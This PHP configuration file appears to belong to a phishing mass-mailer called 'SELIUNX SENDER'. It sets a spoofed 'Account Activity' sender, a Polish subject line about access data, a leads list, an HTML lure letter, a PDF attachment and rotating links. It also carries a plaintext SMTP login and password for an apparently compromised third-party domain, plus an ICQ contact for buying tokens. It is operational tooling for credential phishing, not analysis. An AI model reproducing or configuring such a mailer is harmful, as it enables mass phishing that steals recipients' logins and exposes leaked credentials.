<?php
/* SELIUNX SENDER Features SETUP */

// PLEASE READ FILE [README.txt] BEFORE USE


//Please Fill your token here
$uToken = "uhr1mCxXcHtFMJUVvATkWLZefD3ys6dR"; // YOU CAN GET YOUR TOKEN FROM ME : ICQ:- 743695769


$fromname = "Account Activity";  $frommail = "info@proyectosanfrancisco.com"; $subject = "Dane dostępowe do";

$mailist = "Leads.txt"; $msgfile = "Letter/Letter.html";   "file/attachment/Request.pdf";

$randurl = array

// IF YOU WANT USE MULTI LINK YOU CAN USE DIFFRENT LINK BELLOW IF YOU JUST HV 1 LINK U SHOULD PUT THAT 1 LINK 5 TIMES

("https://exmple.com/", //link 1 = ##short##
"https://exmple.com/", //link 2  = ##short##
"https://exmple.com/", //link 3  = ##short##
"https://exmple.com/", //link 4  = ##short##
"https://exmple.com/", //link 5  = ##short##

);

$priority = 1; $sleeptime = 2; $replacement = 1; $userremoveline = 0; $ratio = 1; $userandom = 2;


/* END */


// FILL ALL WITH SMTP

	$smtpserver = "proyectosanfrancisco.com";	// Required  //Smtp Server

	$smtpuser = "info@proyectosanfrancisco.com";		// Required //Smtp Username / ID

	$smtppass = "king1337";	// Required

	$smtpport = "587";		// Required

/* END */

?>